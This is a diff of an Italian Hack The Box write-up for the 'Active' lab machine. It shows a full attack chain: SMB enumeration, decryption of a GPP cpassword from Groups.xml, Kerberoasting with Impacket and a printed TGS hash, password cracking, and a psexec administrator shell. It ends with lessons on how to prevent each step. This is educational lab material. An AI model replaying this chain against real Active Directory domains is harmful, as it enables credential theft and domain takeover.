@@ -1,8 +1,16 @@
+---
+cover: ../.gitbook/assets/capture.png
+coverY: 57
+---
+
+# Active
+
 **Target: 10.10.10.100**
 
-# INFORMATION GATHERING
+## INFORMATION GATHERING
 
-Lanciamo un privo veloce scan con [[Nmap]]
+Lanciamo un privo veloce scan con \[\[Nmap]]
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/active]
 └─# nmap -sC -sV -O 10.10.10.100                   
@@ -104,35 +112,34 @@ Host script results:
 
 Ricapitolando abbiamo :
 
-- Porta 53: esegue DNS 6.1.7601
-- Porta 88: Kerberos in esecuzione
- - Porte 135, 593, 49152, 49153, 49154, 49155, 49157, 49158: esecuzione di msrpc
-- Porte 139 e 445: esecuzione di SMB
-- Porte 389 e 3268: esecuzione di Active Directory LDAP
-- Porta 464: esecuzione di kpasswd5. Questa porta viene utilizzata per modificare/impostare le password rispetto ad Active Directory
-- Porte 636 e 3269: come indicato nella pagina FAQ di nmap, ciò significa che la porta è protetta da tcpwrapper, che è un programma di controllo dell'accesso alla rete basato su host
+* Porta 53: esegue DNS 6.1.7601
+* Porta 88: Kerberos in esecuzione
+* Porte 135, 593, 49152, 49153, 49154, 49155, 49157, 49158: esecuzione di msrpc
+* Porte 139 e 445: esecuzione di SMB
+* Porte 389 e 3268: esecuzione di Active Directory LDAP
+* Porta 464: esecuzione di kpasswd5. Questa porta viene utilizzata per modificare/impostare le password rispetto ad Active Directory
+* Porte 636 e 3269: come indicato nella pagina FAQ di nmap, ciò significa che la porta è protetta da tcpwrapper, che è un programma di controllo dell'accesso alla rete basato su host
 
 lo scan completo aggiunge ulteriori 6 porte
 
-- Porta 5722: esecuzione del servizio di replica DFS (Microsoft Distributed File System).
-- Porta 9389: esecuzione del protocollo .NET Message Framing
-- Porta 47001: esegue Microsoft HTTPAPI httpd 2.0
-- Porte 49169, 49171, 49182: servizi in esecuzione che non sono stati identificati da nmap. Colpiremo di più queste porte se le altre porte non funzionano.
+* Porta 5722: esecuzione del servizio di replica DFS (Microsoft Distributed File System).
+* Porta 9389: esecuzione del protocollo .NET Message Framing
+* Porta 47001: esegue Microsoft HTTPAPI httpd 2.0
+* Porte 49169, 49171, 49182: servizi in esecuzione che non sono stati identificati da nmap. Colpiremo di più queste porte se le altre porte non funzionano.
 
-# ENUMERATION
+## ENUMERATION
 
-## DNS
+### DNS
+
 La scansione nmap rivela che il nome di dominio della macchina è active.htb. Quindi modificheremo il file /etc/hosts per associare l'indirizzo IP della macchina al nome di dominio active.htb
 
 ```bash
 10.10.10.100 active.htb
 ```
 
+Dagli indizi che ci fornice nmap sembbra che ci troviamo di forte ad una macchina Windows sulla quale gira \[\[Active Directory]]
 
-Dagli indizi che ci fornice nmap sembbra che ci troviamo di forte ad una macchina Windows sulla quale gira [[Active Directory]]
-
-Come prima cosa che faccio è l'enumerazione del [[Port 53 DNS|DNS]] utilizzandno nslookup per avere maggiori informazioni su questo dominio
-
+Come prima cosa che faccio è l'enumerazione del \[\[Port 53 DNS|DNS]] utilizzandno nslookup per avere maggiori informazioni su questo dominio
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/active]
@@ -147,6 +154,7 @@ Address: 10.10.10.100#53
 ```
 
 Nulla di nuovo, proviamo con un Zone Transfer
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/active]
 └─# dig axfr active.htb @10.10.10.100
@@ -157,11 +165,11 @@ Nulla di nuovo, proviamo con un Zone Transfer
 
 ```
 
-Niente neanche qui 
+Niente neanche qui
 
 Quindi passeremo all'enumerazione di SMB sulle porte 139 e 445. Inizieremo con la visualizzazione delle condivisioni SMB.
 
-## [[Port 139 Netbios|SMB]]
+### \[\[Port 139 Netbios|SMB]]
 
 Vediamo con le condivisioni attive con smbmap
 
@@ -179,7 +187,7 @@ Replication                                             READ ONLY
 SYSVOL                                                  NO ACCESS       server Users                                                   NO ACCESS
 ```
 
-Interresante, la cartella "Replication"  è l'unica in cui abbiamo i permessi di lettura, proviamo a connetterci in anonimo 
+Interresante, la cartella "Replication" è l'unica in cui abbiamo i permessi di lettura, proviamo a connetterci in anonimo
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/active]
@@ -193,7 +201,8 @@ smb: \> dir
  5217023 blocks of size 4096. 284087 blocks available
 smb: \> 
 ```
-Siamo dentro 
+
+Siamo dentro
 
 Dopo aver esaminato tutti i file su questa condivisione, ho trovato un file Groups.xml nella seguente directory.
 
@@ -203,7 +212,7 @@ cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preference
 
 Una rapida ricerca su Google ci dice che il file Groups.xml è un file Group Policy Preference (GPP). GPP è stato introdotto con il rilascio di Windows Server 2008 e ha consentito la configurazione di computer aggiunti al dominio. Una caratteristica pericolosa di GPP era la possibilità di salvare password e nomi utente nei file delle preferenze. Le password sono state crittografate con AES, la chiave è stata resa disponibile al pubblico.
 
-https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
+https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
 
 Pertanto, se siamo riusciti a compromettere qualsiasi account di dominio, si semplicemente prendere il file groups.xml e decrittografare le password. Per ulteriori informazioni su questa vulnerabilità, fare riferimento a questo sito.
 
@@ -215,7 +224,7 @@ Ora che sappiamo quanto sia importante questo file, scarichiamolo nella nostra m
 get Groups.xml
 ```
 
-e vediamo il contenuto 
+e vediamo il contenuto
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/active]
@@ -232,11 +241,9 @@ userName="active.htb\SVC_TGS"
 cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
 ```
 
-# GAINING AN INITIAL FOOTHOLD
+## GAINING AN INITIAL FOOTHOLD
 
-Come accennato in precedenza, la password è crittografata con AES, che è un potente algoritmo di crittografia. Tuttavia, poiché la chiave è pubblicata [online](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), possiamo facilmente decrittografare la password crittografata.
-Esiste un semplice programma ruby ​​noto come gpp-decrypt che utilizza la chiave divulgata pubblicamente per decrittografare qualsiasi stringa crittografata GPP. Questo programma è incluso nell'installazione predefinita di Kali.
-Usiamolo per decifrare la password che abbiamo trovato.
+Come accennato in precedenza, la password è crittografata con AES, che è un potente algoritmo di crittografia. Tuttavia, poiché la chiave è pubblicata [online](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), possiamo facilmente decrittografare la password crittografata. Esiste un semplice programma ruby ​​noto come gpp-decrypt che utilizza la chiave divulgata pubblicamente per decrittografare qualsiasi stringa crittografata GPP. Questo programma è incluso nell'installazione predefinita di Kali. Usiamolo per decifrare la password che abbiamo trovato.
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/active]
@@ -244,10 +251,10 @@ Usiamolo per decifrare la password che abbiamo trovato.
 GPPstillStandingStrong2k18
 ```
 
-Abbiamo delle credenziali
-SVC_TGS:GPPstillStandingStrong2k18
+Abbiamo delle credenziali SVC\_TGS:GPPstillStandingStrong2k18
 
 Sicuramente non sono le credenziali dell'ADMIN proviamo a collegarci alla cartella USERS
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/active]
 └─# smbclient //active.htb/Users -U SVC_TGS
@@ -282,10 +289,9 @@ smb: \SVC_TGS\Desktop\> exit
 f82c7da725acec03048d5707633da381
 ```
 
-# PRIVESC
+## PRIVESC
 
-Poiché lavoriamo con [[Active Directory]] e utilizziamo Kerberos come protocollo di autenticazione, proviamo una tecnica nota come Kerberoasting. 
-Per capire come funziona questo attacco, devi capire come funziona il protocollo di [[Kerberos Authentication]].
+Poiché lavoriamo con \[\[Active Directory]] e utilizziamo Kerberos come protocollo di autenticazione, proviamo una tecnica nota come Kerberoasting. Per capire come funziona questo attacco, devi capire come funziona il protocollo di \[\[Kerberos Authentication]].
 
 L'obiettivo di Kerberoasting è raccogliere i ticket TGS per i servizi eseguiti per conto degli account utente di dominio. Parte di questi ticket TGS sono chiavi crittografate derivate dalle password degli utenti. Di conseguenza, le loro credenziali potrebbero essere violate offline.
 
@@ -307,13 +313,11 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$bd7c9e2930675c2c9faca02ae13421e0$9ebbd395aabaa0a1b075ce62395dc9572cb8e9aa084c833605a35e57e7e902ccd415ddaf317dbf225e929a94cef03c34db71e0d66a6206de6e5d0239c9ae72fe0f5829b5467ceaedf3ffa8c8117ce9756a0ff4bc6f5f341ba1abb252ffeb4de38400d1e3ab71f465605b7efb81b4d8e2770ffb8951f8202f9b3f43a641d54a81dbd581430920c52f0eb2fddc7d5f1c625fabad9f1d5e30d518926c6c96fe43e3ab24d8904066d4c5f419cda5a33e0aa6e32baf073d149bcd149b1e7ff51f122aae321c76861d21543786685383cb03a5ef228893237ea6b09319dff74ae83ca9b61902a34782c754a9143ecc231e96be5dde0a28fe82683d55907c9426b6eb757401ca45884ba20f9ccecce99d278e039aaee1e7e23f1b8c811acfa19a147ab092c4523cd5beb5ccbc766f2811aec05f56c508be945961fa3c451c057b77d8e395a09957d56a0ea9d0a320aff8c7dead51a4a664e073fbeb3029dab883e376e4fa341d973bb2855406efaa9bfcab801e851d9e81ba5fe4ae7f5113d36bca9503a1d06bb9f556114162eed2e7cfbb1b208f45fcc2a5dc1121aaa71eb44961b9387054107287da2994cc14a345e6db1d000655231908a12c2b7aeb7b630c48d1b27489b3a5f28291532bfedb1a6efbaa6be56927d6d5e652253a722854e953a746d947d5323d050f73bb9f1023d0fa342371844b1f523a5aeb32204182bfa91b6165138e9a878d949a1ecebc9b673e2e63814071419340addac808888a816fecef35c50aed6ae4e380fec26109bd225997c111f80d2c8063919eb541115d90f76198192bdb75bdbc4c2f6956bd800b1977f556f10f6b0567e0d2340dca9035359c6219cb271c0a7955c955dfa6d69281321e37d42d1f9d00d21bf17fe1451eedbc4f9cf093f674e1857c1da1dc7ad298846dc32a42354867b47bee45a17a969fe1059532f289c4289ac9fc1ee29221f5216ee376e773aea2df88c975f82caa026fc465255d224a9e5a63126c54725304c57056bdb887919f65e354268394999dd21514c0bc4ba3e1569363aede7bdc36d168f0914324860e82288a0965cf115e5b316c2a240f66cbac5354822c5661a493f0cf12444ec207a6671eb1c2b8d71ea905d43d7325cc6c92a23dc233a1783e17eb3ac7dd669b5ecb8b15c0e70a514ac3dc1fcb65862a82a1546ffb0f9b00cf8f983be771499550d76503b166ab04aaae6780132c97d71f267155181fb883702c9ba3f05eb57692a5d76f
 ```
 
-- **target:** domain/username:password
-- **-dc-ip**: IP address of the domain controller
-- **-request**: Richiede TGS per gli utenti e li restituisce in formato JtR/hashcat
+* **target:** domain/username:password
+* **-dc-ip**: IP address of the domain controller
+* **-request**: Richiede TGS per gli utenti e li restituisce in formato JtR/hashcat
 
-Siamo stati in grado di richiedere un TGS da un amministratore SPN. Se riusciamo a decifrare il TGS, saremo in grado di aumentare i privilegi!
-Nota: se ricevi un "Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)", probabilmente è perché la data e l'ora della macchina dell'attacco non sono sincronizzate con il server Kerberos.
-Ora che abbiamo un TGS valido che è già in formato John the Ripper, proviamo a decifrarlo.
+Siamo stati in grado di richiedere un TGS da un amministratore SPN. Se riusciamo a decifrare il TGS, saremo in grado di aumentare i privilegi! Nota: se ricevi un "Kerberos SessionError: KRB\_AP\_ERR\_SKEW(Clock skew too great)", probabilmente è perché la data e l'ora della macchina dell'attacco non sono sincronizzate con il server Kerberos. Ora che abbiamo un TGS valido che è già in formato John the Ripper, proviamo a decifrarlo.
 
 lo salviamo in file txt
 
@@ -336,7 +340,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-Per accedere come amministratore, utilizzeremo un altro script Impacket noto come psexec.py. 
+Per accedere come amministratore, utilizzeremo un altro script Impacket noto come psexec.py.
 
 ```bash
 ┌──(root㉿kali)-[/usr/local/bin]
@@ -360,7 +364,6 @@ C:\Windows\system32>
 
 ```
 
-
 Root Flag
 
 ```bash
@@ -369,13 +372,12 @@ Root Flag
 c0c7a69ba275a7393e3940bbbbd17eb6
 ```
 
-# LESSON LEARNED
+## LESSON LEARNED
 
 Per ottenere un punto d'appoggio iniziale sul sistema, abbiamo prima effettuato l'accesso anonimo alla condivisione di replica e trovato un file GPP che conteneva credenziali crittografate. Poiché la chiave AES utilizzata per crittografare le credenziali è pubblicamente disponibile, siamo stati in grado di ottenere la password in chiaro e accedere come utente con privilegi limitati.
 
-Poiché questo utente con privilegi limitati era connesso al dominio e disponeva di un TGT valido, abbiamo utilizzato una tecnica chiamata kerberoasting per aumentare i privilegi. Ciò ha comportato la richiesta al controller di dominio di fornirci ticket TGS validi per tutti gli SPN associati al nostro account utente. Da lì, abbiamo ottenuto un ticket di servizio TGS dell'amministratore su cui abbiamo eseguito un attacco di forza bruta per ottenere le credenziali dell'amministratore.
-Pertanto, ho contato tre vulnerabilità che ci hanno consentito di ottenere l'accesso a livello di amministratore su questa macchina.
+Poiché questo utente con privilegi limitati era connesso al dominio e disponeva di un TGT valido, abbiamo utilizzato una tecnica chiamata kerberoasting per aumentare i privilegi. Ciò ha comportato la richiesta al controller di dominio di fornirci ticket TGS validi per tutti gli SPN associati al nostro account utente. Da lì, abbiamo ottenuto un ticket di servizio TGS dell'amministratore su cui abbiamo eseguito un attacco di forza bruta per ottenere le credenziali dell'amministratore. Pertanto, ho contato tre vulnerabilità che ci hanno consentito di ottenere l'accesso a livello di amministratore su questa macchina.
 
-- Abilitazione dell'accesso anonimo a una condivisione SMB che conteneva informazioni riservate. Ciò avrebbe potuto essere evitato disabilitando l'accesso anonimo/ospite sulle condivisioni SMB.
-- L'uso del GPP vulnerabile. Nel 2014, Microsoft ha rilasciato un bollettino sulla sicurezza per MS14-025 in cui si afferma che le preferenze dei criteri di gruppo non consentiranno più il salvataggio di nomi utente e password. Tuttavia, se utilizzi versioni precedenti, questa funzionalità può ancora essere utilizzata. Allo stesso modo, potresti aver aggiornato il tuo sistema ma aver accidentalmente lasciato file di preferenze sensibili che contengono credenziali.
-- L'uso di credenziali deboli per l'account amministratore. Anche se avessimo ottenuto un ticket TGS valido, non saremmo stati in grado di aumentare i privilegi se l'amministratore avesse utilizzato una lunga password casuale che ci avrebbe richiesto una quantità irrealistica di potenza di calcolo e tempo per decifrarla.
+* Abilitazione dell'accesso anonimo a una condivisione SMB che conteneva informazioni riservate. Ciò avrebbe potuto essere evitato disabilitando l'accesso anonimo/ospite sulle condivisioni SMB.
+* L'uso del GPP vulnerabile. Nel 2014, Microsoft ha rilasciato un bollettino sulla sicurezza per MS14-025 in cui si afferma che le preferenze dei criteri di gruppo non consentiranno più il salvataggio di nomi utente e password. Tuttavia, se utilizzi versioni precedenti, questa funzionalità può ancora essere utilizzata. Allo stesso modo, potresti aver aggiornato il tuo sistema ma aver accidentalmente lasciato file di preferenze sensibili che contengono credenziali.
+* L'uso di credenziali deboli per l'account amministratore. Anche se avessimo ottenuto un ticket TGS valido, non saremmo stati in grado di aumentare i privilegi se l'amministratore avesse utilizzato una lunga password casuale che ci avrebbe richiesto una quantità irrealistica di potenza di calcolo e tempo per decifrarla.
